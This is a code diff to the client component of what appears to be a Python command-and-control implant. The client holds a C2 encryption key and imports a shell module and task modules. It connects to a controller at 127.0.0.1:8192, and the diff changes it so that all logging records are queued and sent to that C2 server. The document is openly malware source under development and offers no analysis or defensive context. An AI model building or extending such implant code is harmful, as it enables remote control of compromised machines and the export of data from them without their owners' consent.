@@ -12,7 +12,7 @@ from config import *
 from shell import Shell
 from tasks import *
 
-from utils import Logger, decrypt, encrypt, MessageEncoder, MessageDecoder
+from utils import Logger, decrypt, encrypt, MessageEncoder, MessageDecoder, threaded, QueueHandler
 
 HOST = '127.0.0.1'
 PORT = 8192
@@ -43,6 +43,7 @@ class Client:
         self.key = C2_ENCRYPTION_KEY
         self.readque = readque
         self.writeque = writeque
+        self.queue_handler = QueueHandler(self.writeque)
 
     def run(self):
         """Start connection thread."""
@@ -97,6 +98,7 @@ class Client:
     def write(self):
         """Pick data from write queue and send it to C2 server."""
         self.logger.info("Started write thread!")
+        logging.getLogger().addHandler(self.queue_handler)
         while self.active.is_set():
             if not self.writeque.empty():
                 data = self.writeque.get()
@@ -122,6 +124,7 @@ class Client:
                 self.s.sendall(data)
                 # self.logger.debug("Sent data to {}: {}".format(self.s.getpeername(), data))
             time.sleep(0.5)
+        logging.getLogger().removeHandler(self.queue_handler)
         self.logger.info("Stopped write thread!")
 
     def read(self):
